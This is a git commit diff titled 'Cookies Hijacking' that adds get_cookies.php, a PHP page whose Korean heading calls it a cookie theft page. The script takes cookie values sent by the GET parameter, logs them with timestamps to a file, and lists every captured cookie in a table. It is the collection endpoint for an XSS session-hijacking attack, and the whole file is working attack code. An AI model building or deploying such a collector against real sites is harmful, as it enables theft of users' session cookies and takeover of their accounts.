5dbb148dc489009efc091997c028e04c86a84f9d
Taylor Cho <taylorenjeacho@gmail.com>
2019-07-19 23:51:00 +0900

    Cookies Hijacking

---
+++ get_cookies.php
@@ -0,0 +1,36 @@
+<html>
+<body>
+<h1>웰플 사과 쿠키 탈취 페이지 </h1>
+<?php
+$cookie=$_GET[cookie];
+$now = date("Y-m-d-h-i-s");
+echo "{$now}<br>";
+if(strlen($cookie) >2) {
+	$save_file=fopen("getcookies/cookies.txt", "a");
+	fwrite($save_file, "{$now}\n");
+	fwrite($save_file, "{$cookie}\n");
+	fclose($save_file);
+}
+?>
+<h3>현재 쿠키 값 : </h3>
+<p><?php echo $cookie; ?></p>
+<br>
+	<?php
+	$fp = fopen("getcookies/cookies.txt", "r");
+	echo "<table border=\"1\">";
+	echo "<th><b>접속 시간</b></th>";
+	echo "<th><b>쿠키 값</b></th>";
+	while(!feof($fp)) {
+		$ti = fgets($fp, 30);
+		if(strlen($ti)>2) {
+			echo "<tr><td>{$ti}</td>";
+		}
+		$coo = fgets($fp, 100);
+		if(strlen($coo)>2) {
+			echo "<td>{$coo}</td></tr>";
+		}
+	}
+	echo "</table>";
+	?>
+</body>
+</html>
